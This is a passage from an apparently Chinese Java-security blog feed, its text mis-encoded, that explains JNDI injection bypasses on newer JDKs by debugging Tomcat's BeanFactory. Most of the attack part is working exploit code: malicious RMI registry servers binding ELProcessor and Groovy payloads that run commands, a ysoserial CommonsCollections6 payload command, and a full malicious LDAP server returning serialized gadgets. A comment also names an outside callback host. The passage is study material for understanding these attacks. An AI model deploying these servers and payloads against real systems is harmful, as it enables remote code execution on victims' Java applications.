src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732953861905-5ec23da2-30ad-48ad-b636-0f7434be98d5.png"></p><p>è·Ÿè¿›çœ‹åˆ°org.apache.naming.factory.BeanFactoryç±»çš„getObjectInstance()å‡½æ•°ä¸­ï¼Œä¼šåˆ¤æ–­objå‚æ•°æ˜¯å¦æ˜¯ResourceRefç±»å®ä¾‹ï¼Œæ˜¯çš„è¯ä»£ç æ‰ä¼šå¾€ä¸‹èµ°ï¼Œ<strong>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬åœ¨æ¶æ„RMIæœåŠ¡ç«¯ä¸­æ„é€ Referenceç±»å®ä¾‹çš„æ—¶å€™å¿…é¡»è¦ç”¨Referenceç±»çš„å­ç±»ResourceRefç±»æ¥åˆ›å»ºå®ä¾‹</strong>ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732954492272-f5011f2a-6c7d-44af-90b6-1717837926bc.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732959539881-9d24ca56-b59c-4dcc-8212-72bdcd30347b.png"></p><p>æ¥ç€è·å–Beanç±»ä¸º<code>javax.el.ELProcessor</code>åï¼Œå®ä¾‹åŒ–è¯¥ç±»å¹¶è·å–å…¶ä¸­çš„forceStringç±»å‹çš„å†…å®¹ï¼Œå…¶å€¼æ˜¯æˆ‘ä»¬æ„é€ çš„<code>x=eval</code>å†…å®¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732959635866-852870b9-7bfc-4a3b-b37f-8355bbc77da8.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732959676394-68224427-adf9-4d3f-8c25-72a3feedf82b.png"></p><p>ç»§ç»­å¾€ä¸‹è°ƒè¯•å¯ä»¥çœ‹åˆ°ï¼ŒæŸ¥æ‰¾forceStringçš„å†…å®¹ä¸­æ˜¯å¦å­˜åœ¨â€&#x3D;â€å·ï¼Œä¸å­˜åœ¨çš„è¯å°±è°ƒç”¨å±æ€§çš„é»˜è®¤setteræ–¹æ³•ï¼Œå­˜åœ¨çš„è¯å°±å–é”®å€¼ã€å…¶ä¸­é”®æ˜¯å±æ€§åè€Œå¯¹åº”çš„å€¼æ˜¯å…¶æŒ‡å®šçš„setteræ–¹æ³•ã€‚å¦‚æ­¤ï¼Œ<strong>ä¹‹å‰è®¾ç½®çš„forceStringçš„å€¼å°±å¯ä»¥å¼ºåˆ¶å°†xå±æ€§çš„setteræ–¹æ³•è½¬æ¢ä¸ºè°ƒç”¨æˆ‘ä»¬æŒ‡å®šçš„eval()æ–¹æ³•äº†ï¼Œè¿™æ˜¯BeanFactoryç±»èƒ½è¿›è¡Œåˆ©ç”¨çš„å…³é”®ç‚¹ï¼</strong>ä¹‹åï¼Œå°±æ˜¯è·å–beanClasså³javax.el.ELProcessorç±»çš„eval()æ–¹æ³•å¹¶å’Œxå±æ€§ä¸€åŒç¼“å­˜åˆ°forcedè¿™ä¸ªHashMapä¸­ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733105140413-e37db1dd-be48-419f-8968-d6148c110919.png"></p><p>æ¥ç€whileè¯­å¥æ¥éå†è·å–ResourceRefç±»å®ä¾‹addrå±æ€§çš„å…ƒç´ ï¼Œå½“è·å–åˆ°addrTypeä¸ºxçš„å…ƒç´ æ—¶é€€å‡ºå½“å‰æ‰€æœ‰å¾ªç¯ï¼Œç„¶åè°ƒç”¨getContent()å‡½æ•°æ¥è·å–xå±æ€§å¯¹åº”çš„contentså³æ¶æ„è¡¨è¾¾å¼ã€‚è¿™é‡Œå°±æ˜¯æ¶æ„RMIæœåŠ¡ç«¯ä¸­ResourceRefç±»å®ä¾‹æ·»åŠ çš„ç¬¬äºŒä¸ªå…ƒç´ ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733105371315-2383c27c-989f-4cff-aaee-68bc2a16b39e.png"></p><p>è·å–åˆ°ç±»å‹ä¸ºxå¯¹åº”çš„å†…å®¹ä¸ºæ¶æ„è¡¨è¾¾å¼åï¼Œä»å‰é¢çš„ç¼“å­˜forcedä¸­å–å‡ºkeyä¸ºxçš„å€¼å³javax.el.ELProcessorç±»çš„eval()æ–¹æ³•å¹¶èµ‹å€¼ç»™methodå˜é‡ï¼Œæœ€åå°±æ˜¯é€šè¿‡method.invoke()å³åå°„è°ƒç”¨çš„æ¥æ‰§è¡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733105497850-e80f14a7-c3c4-4ea0-9f0d-88fddb534bb1.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732953958131-1ecf39f7-843d-49b3-8d28-81cefcaf9b26.png"></p><p>æœ€å…³é”®çš„å…¶å®åœ¨è¿™é‡Œï¼Œæœ‰ä¸€ä¸ªåå°„çš„æ–¹æ³•,è¯¥ç±»çš„<code>getObjectInstance()</code>å‡½æ•°ä¸­ä¼šé€šè¿‡åå°„çš„æ–¹å¼å®ä¾‹åŒ–Referenceæ‰€æŒ‡å‘çš„ä»»æ„Bean Classï¼Œå¹¶ä¸”ä¼šè°ƒç”¨setteræ–¹æ³•ä¸ºæ‰€æœ‰çš„å±æ€§èµ‹å€¼ã€‚è€Œè¯¥Bean Classçš„ç±»åã€å±æ€§ã€å±æ€§å€¼ï¼Œå…¨éƒ½æ¥è‡ªäº<code>Reference</code>å¯¹è±¡ï¼Œå‡æ˜¯æ”»å‡»è€…å¯æ§çš„ã€‚</p><h3 id="æœåŠ¡ç«¯rmiä»£ç "><a href="#æœåŠ¡ç«¯rmiä»£ç " class="headerlink" title="æœåŠ¡ç«¯rmiä»£ç "></a>æœåŠ¡ç«¯rmiä»£ç </h3><h4 id="elè¡¨è¾¾å¼"><a href="#elè¡¨è¾¾å¼" class="headerlink" title="elè¡¨è¾¾å¼"></a>elè¡¨è¾¾å¼</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 1097&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;evilEL&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="grovy"><a href="#grovy" class="headerlink" title="grovy"></a>grovy</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Creating evil RMI registry on port 1097&quot;</span>);</span><br><span class="line">    <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=parseClass&quot;</span>));</span><br><span class="line">    <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> <span class="string">&quot;@groovy.transform.ASTTest(value=&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    assert java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;)\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;def x\n&quot;</span>;</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,script));</span><br><span class="line"></span><br><span class="line">    <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">    registry.bind(<span class="string">&quot;evilGroovy&quot;</span>, referenceWrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LDAPé«˜ç‰ˆæœ¬ç»•è¿‡"><a href="#LDAPé«˜ç‰ˆæœ¬ç»•è¿‡" class="headerlink" title="LDAPé«˜ç‰ˆæœ¬ç»•è¿‡"></a>LDAPé«˜ç‰ˆæœ¬ç»•è¿‡</h2><p>å…¶å®è¿™é‡Œå°±æ˜¯åœ¨åˆ†æLDAP+JNDIçš„æ—¶å€™ä»–æœ‰ä¸ªç±»ä¼¼swichçš„ä¸œè¥¿ï¼Œå½“æ—¶ä¼ å…¥çš„æ˜¯å¼•ç”¨ç±»ï¼Œæ‰€ä»¥èµ°äº†å¼•ç”¨ç±»çš„é€»è¾‘ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„æ˜¯åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œå¹¶ä¸”åç»­ä¼šè¢«ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºå­˜åœ¨äº†ä¸€ä¸ªå¤©ç„¶çš„ååºåˆ—åŒ–å…¥å£äº†ï¼Œå°±å¯ä»¥è§¦å‘æœ¬åœ°çš„Gadgetäº†ï¼Œå¯ä»¥çœ‹ç™½æ—¥æ¢¦ç»„é•¿çš„JNDIçš„è§†é¢‘ã€‚</p><p>å…ˆæ„é€ ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„ç¯å¢ƒ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ysoå·¥å…·ç”Ÿæˆpayload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections6 <span class="string">&#x27;open -a Calculator&#x27;</span> | base64</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå†™ä¸€ä¸ªLDAPæœåŠ¡å™¨çš„ä»£ç å¹¶æ‰“æˆjaråŒ…æ–¹ä¾¿ä»¥åä½¿ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.jndibypass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="comment">//é«˜ç‰ˆæœ¬LDAPç»•è¿‡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] tmp_args )</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">if</span> (tmp_args.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Usage: java xxx.jar &lt;IP&gt; &lt;file&gt;&quot;</span>);</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> tmp_args[<span class="number">0</span>];</span><br><span class="line">        String[] args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://&quot;</span> + ip +<span class="string">&quot;/#Evail&quot;</span>&#125;;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(tmp_args[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            payload = FileUtils.readFileToString(file);</span><br><span class="line">            System.out.println(payload);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">6666</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                port,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">        config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ]), payload));</span><br><span class="line">        <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">        System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">        ds.startListening();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="keyword">private</span> String payload;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb , String payload)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">            <span class="built_in">this</span>.payload = payload;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e, payload);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">(InMemoryInterceptedSearchResult result, String base, Entry e , String payload)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(payload));</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡è¿™é‡Œæ‰“jaråŒ…æœ‰å¤ªå¤šå‘ç‚¹å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/NullNullAgo/article/details/124703694">https://blog.csdn.net/NullNullAgo/article/details/124703694</a></p><p><a href="https://blog.csdn.net/qq_42476644/article/details/112178820">https://blog.csdn.net/qq_42476644&#x2F;article&#x2F;details&#x2F;112178820</a></p><p>å°†ä¸Šé¢ç”Ÿæˆçš„paylodaæ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­æ”¾åˆ°ldapé‡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar LDAPServer.jar <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733143029024-66883c6b-a87d-463c-aa2e-21b2cdb59654.png"></p><p>ä¹‹ååœ¨å¯æ§ç«¯è¾“å…¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733143143770-f80c690f-d579-4b71-9ba0-ad8b510dcfff.png"></p><p>ç°åœ¨å¼€å§‹è°ƒè¯•ï¼Œå‰é¢çš„lookupå’Œä¹‹å‰ä¸€æ ·ä¸»è¦çœ‹å…³é”®ç‚¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733146117176-16c3b9f6-b53e-4617-8445-399c150d77b6.png"></p><p>è·Ÿåˆ°decodeObjecté‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733146148308-180970fc-8f7f-4a21-aa50-0f3a7ad0b49d.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šæ ¹æ®ä¸åŒçš„ç±»å‹è¿›å…¥ä¸åŒçš„åˆ¤æ–­ä¹‹å‰æ˜¯å·¥å‚ç±»ç°åœ¨æ˜¯åºåˆ—åŒ–çš„æ•°æ®ï¼Œæ‰€ä»¥ä¼šè¿›å…¥ç¬¬ä¸€ä¸ªåˆ¤æ–­</p><p>æ‰§è¡ŒdeserializeObjectæ–¹æ³•ï¼Œè·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733146275002-190dd5fd-0a3a-4b12-8a21-8535d4134396.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šååºåˆ—åŒ–è¯»å‡ºæ¥</p><p>å‚è€ƒï¼š<a href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a></p><p><a href="http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/#%E5%88%A9%E7%94%A8LDAP%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0Gadget">http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/#%E5%88%A9%E7%94%A8LDAP%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0Gadget</a></p><p><a href="https://www.cnblogs.com/bitterz/p/15946406.html">https://www.cnblogs.com/bitterz/p/15946406.html</a></p><p><a href="https://forum.butian.net/share/1895">https://forum.butian.net/share/1895</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ³¨å…¥ </tag>
            
            <tag> JNDI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå†…å­˜é©¬</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
